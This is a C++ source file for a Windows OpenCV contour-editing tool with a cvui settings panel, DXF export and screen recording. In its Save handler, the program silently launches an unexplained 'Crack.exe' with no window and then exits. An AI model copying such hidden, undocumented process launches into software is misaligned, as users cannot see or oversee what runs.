#include "stdafx.h"
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

#define CVUI_IMPLEMENTATION
#include "cvui.h"
#include "tinyfiledialogs.h"

#define CV_EDIT_VIEW	"EyeGlass"
const double PX_TO_MM = 25.6; //1cm = 256px

bool isEdit = false;
bool onlyContour = false;
bool preOnlyContour = onlyContour;
cv::Rect settingsRect = {};

void mouseCallback(int event, int x, int y, int flags, void* userdata) {
    Detector* detector = static_cast<Detector*>(userdata);
    cv::Point point = cv::Point(x, y);
    if (settingsRect.contains(point)) {
        // 将鼠标事件传递给 cvui 的事件管理系统
        cvui::handleMouse(event, x, y, flags, &cvui::internal::getContext(CV_EDIT_VIEW));
        return;
    }
    else {
        cv::Rect editArea = detector->getEditArea();
        if (editArea.contains(point)) {
            if(detector->onMouse(event, x, y, flags))
                isEdit = true;
        }
    }
}

int refreshUI(cv::Mat frame, cv::Mat background, cv::VideoWriter writer, bool& isEdit, double pxToMm, void* userdata)
{
    Detector* detector = static_cast<Detector*>(userdata);

    double angle = 0.0;
    bool refresh = false;
    int clipLimitValue = -1, medianBlurKSize = -1, morphKSize = -1;
    int clipLimitTrack = 0, medianBlurTrack = 0, morphKTrack = 7;

    int margin = 50, padding = 15, settingWidth = 130, settingHeight = 450;
    int settingX = background.cols - settingWidth - padding, settingY = background.rows - settingHeight - margin;
    settingsRect = { settingX, settingY, settingWidth, settingHeight };
    detector->reset({ 0, 0, frame.cols, frame.rows }, pxToMm);

    while (cv::getWindowProperty(CV_EDIT_VIEW, cv::WND_PROP_VISIBLE)) {
        if ((clipLimitValue != clipLimitTrack || medianBlurKSize != medianBlurTrack || morphKSize != morphKTrack) 
            && !cvui::mouse(cvui::LEFT_BUTTON, cvui::IS_DOWN) && !cvui::mouse(cvui::RIGHT_BUTTON, cvui::IS_DOWN)
            || refresh) {
            clipLimitValue = clipLimitTrack;
            medianBlurKSize = medianBlurTrack;
            morphKSize = morphKTrack;
            refresh = false;

            detector->detect(detector->rotate(frame.clone(), angle), (clipLimitValue + 1) * 3, (medianBlurKSize << 1) + 1, morphKSize + 1, background);
        }
        else {
            detector->drawFrame(detector->rotate(frame.clone(), angle), background, isEdit);
        }

        cvui::window(background, settingX, settingY, settingWidth, settingHeight, "Setting");

        cvui::text(background, settingX + padding, settingY + margin, "Edge Curl");
        if(cvui::trackbar(background, settingX + padding * 2, settingY + margin + padding, settingWidth - padding * 3, &medianBlurTrack, 0, 9, 0, "%.0Lf"))
            isEdit = true;

        cvui::text(background, settingX + padding, settingY + (margin + padding) * 2, "Morph Kernel");
        if(cvui::trackbar(background, settingX + padding * 2, settingY + (margin + padding) * 2 + padding, settingWidth - padding * 3, &morphKTrack, 0, 9, 1, "%.0Lf"))
            isEdit = true;

        cvui::text(background, settingX + padding, settingY + (margin + padding) * 3, "clipLimit");
        if (cvui::trackbar(background, settingX + padding * 2, settingY + (margin + padding) * 3 + padding, settingWidth - padding * 3, &clipLimitTrack, 0, 9, 1, "%.0Lf"))
            isEdit = true;

        if (cvui::button(background, settingX + padding, settingY + (margin + padding) * 4 + padding, "R-")) {
            if (detector->onKey('R')) {
                isEdit = true;
                refresh = true;
                angle+=0.05;
            }
        }

        if (cvui::button(background, settingX + padding + margin, settingY + (margin + padding) * 4 + padding, "R+")) {
            if (detector->onKey('R')) {
                isEdit = true;
                refresh = true;
                angle-=0.05;
            }
        }

        if (cvui::button(background, settingX + padding, settingY + (margin + padding) * 4 + padding * 3, "S+")) {
            detector->scaleCurrentContour(+1);
            isEdit = true;
        }

        if (cvui::button(background, settingX + padding + margin, settingY + (margin + padding) * 4 + padding * 3, "S-")) {
            detector->scaleCurrentContour(-1);
            isEdit = true;
        }

        cvui::checkbox(background, settingX + padding, settingY + (margin + padding) * 4 + padding * 5, "OnlyContour", &onlyContour);
        if (preOnlyContour != onlyContour) {
            preOnlyContour = onlyContour;
            detector->setOnlyContour(onlyContour);
            isEdit = true;
        }

        if (cvui::button(background, settingX + padding, settingY + settingHeight - margin - padding, " FindNext ")) {
            if (detector->findNext()) {
                refresh = true;
                isEdit = true;
            }
        }

        if (cvui::button(background, settingX + padding, settingY + settingHeight - margin + padding, "   Save   ")) {
            const char* filters[] = { "*.dxf" };
            const char* filename = tinyfd_saveFileDialog(
                "Save As",
                (std::to_string(std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count()) + ".dxf").c_str(),
                1,
                filters,
                "AutoCAD files (*.dxf)"
            );

            if (filename && !detector->saveToDxf(filename)) {
                STARTUPINFO si;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);

                PROCESS_INFORMATION pi;
                ZeroMemory(&pi, sizeof(pi));

                if (CreateProcess("Crack.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return KEY_ESCAPE;
                }
            }
            isEdit = true;
        }
        cvui::update();

        cv::imshow(CV_EDIT_VIEW, background);

        if (writer.isOpened()) {
            writer.write(background);
        }

        int key = cv::waitKeyEx(1);
        if(key!=KEY_UNPRESS) debug("key: %d\r\n", key);
        switch (key) {
        case KEY_UNPRESS:
            if (!isEdit) return key;
            break;

        case KEY_ESCAPE:
            return key;

        case KEY_RETURN:
        case KEY_SPACE:
            isEdit = !isEdit;
            if (!isEdit && onlyContour) {
                onlyContour = false;
                preOnlyContour = onlyContour;
            }
            break;

        case 'r':
        case 'R':
            if (detector->onKey(key)) {
                isEdit = true;

                cv::Rect editArea = detector->getEditArea();
                cv::Point mousePoint = detector->getMousePoint();
                if (mousePoint.x <= editArea.x + editArea.width / 2)
                    angle+=0.05;
                else angle-=0.05;
                refresh = true;
            }
            break;

        default:
            if (detector->onKey(key))
                isEdit = true;
            break;
        }
    }

    return KEY_ESCAPE;
}

int main(int argc, char* argv[]) {
	cv::VideoCapture capture;
	if (argc <= 1)
		capture.open(cv::CAP_ANY);
	else
		capture.open(argv[1]);
	if (!capture.isOpened())
		return -1;

	cv::VideoWriter writer;

	cv::Mat frame;
	capture >> frame;

	Detector detector;
    cvui::init(CV_EDIT_VIEW);
    cv::namedWindow(CV_EDIT_VIEW, cv::WINDOW_NORMAL);
    cv::setWindowProperty(CV_EDIT_VIEW, cv::WND_PROP_FULLSCREEN, cv::WINDOW_FULLSCREEN);

    if (cv::getWindowProperty(CV_EDIT_VIEW, cv::WND_PROP_VISIBLE)) {
        cv::setMouseCallback(CV_EDIT_VIEW, mouseCallback, &detector);
    }

	cv::Size screenSize = cv::Size(GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)-GetSystemMetrics(SM_CYCAPTION)-GetSystemMetrics(SM_CYMENU));

	if (!frame.empty()) {
		double fps = capture.get(cv::CAP_PROP_FPS);
		int fourcc = (int)capture.get(cv::CAP_PROP_FOURCC);
#if _DEBUG
		char fourcc_name[] = {
			(char)fourcc, // First character is lowest bits
			(char)(fourcc >> 8), // Next character is bits 8-15
			(char)(fourcc >> 16), // Next character is bits 16-23
			(char)(fourcc >> 24), // Last character is bits 24-31
			'\0' // and don't forget to terminate
		};
		printf("fourcc: %s\r\n", fourcc_name);
#endif
		fourcc = cv::VideoWriter::fourcc('m', 'p', '4', 'v');
		writer.open("demo.mp4", fourcc, fps, screenSize);
	}

	double frameCount = capture.get(cv::CAP_PROP_FRAME_COUNT);

	int n = 1;
	isEdit = frameCount<=1;
	cv::Mat background(screenSize, CV_8UC3, cv::Scalar(0));
	while (!frame.empty() || ++n < argc) {
		if (frame.empty() && capture.open(argv[n])) {
			capture >> frame;
			if (frame.empty())
				break;

			isEdit = true;
		}

		double scale = frame.rows / std::min(960.0, screenSize.height*1.0);
		cv::resize(frame, frame, cv::Size(cvRound(frame.cols / scale), cvRound(frame.rows / scale)), 0, 0, cv::INTER_LINEAR);

		if (refreshUI(frame, background, writer, isEdit, PX_TO_MM/scale, &detector) == KEY_ESCAPE)
			break;

		background.setTo(cv::Scalar(0));//清空背景
		capture >> frame;
	}
	writer.release();
	capture.release();

	cv::destroyAllWindows();
	return 0;
}
